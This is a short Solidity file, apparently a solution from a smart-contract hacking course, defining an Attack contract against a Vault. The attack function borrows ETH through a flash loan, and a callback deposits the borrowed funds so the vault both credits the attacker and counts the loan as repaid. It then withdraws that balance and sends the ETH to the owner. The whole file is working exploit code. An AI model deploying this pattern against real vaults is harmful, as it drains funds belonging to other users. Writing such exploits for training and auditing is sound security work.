// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

import "forge-std/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

interface Vault {
    function depositETH() external payable;
    function withdrawETH() external;
    function flashLoanETH(uint256 amount) external;
}

contract Attack {

    using Address for address payable;

    Vault public vault;
    address private owner;

    constructor (address _vault) {
        vault = Vault(_vault);
        owner = msg.sender;
    }

    function attack(uint256 _amount) public {
        require(msg.sender == owner, "not owner");
        vault.flashLoanETH(_amount);
        vault.withdrawETH();
        msg.sender.call{value: _amount}("");
    }

    function callBack() external payable {
        // manipulate balance mapping and returns the 
        // loan at the same time
        vault.depositETH{value: msg.value}();
    }

    receive() external payable {

    }

}